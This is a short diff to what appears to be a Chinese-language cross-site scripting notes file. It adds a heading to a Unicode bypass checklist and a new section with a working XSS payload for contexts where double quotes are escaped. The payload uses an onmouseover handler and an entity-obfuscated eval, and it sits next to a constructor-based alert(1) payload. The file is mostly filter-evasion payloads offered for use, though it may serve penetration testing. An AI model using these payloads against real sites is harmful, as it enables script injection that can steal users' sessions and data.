@@ -38,7 +38,9 @@ B["constructor"]["constructor"]("alert(1)")();
 
 
 
-unicode绕过checklist:
+
+
+### unicode绕过checklist:
 
 https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
 
@@ -69,6 +71,18 @@ Final Payload:
 
 
 
+
+### 双引号被转义的时候逃逸
+
+```
+<xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>
+
+Works in cases where double quotes are escaped 
+
+<xhzeem/x=\" ....>
+```
+
+S
 
 ## 挖掘XSS技巧
 
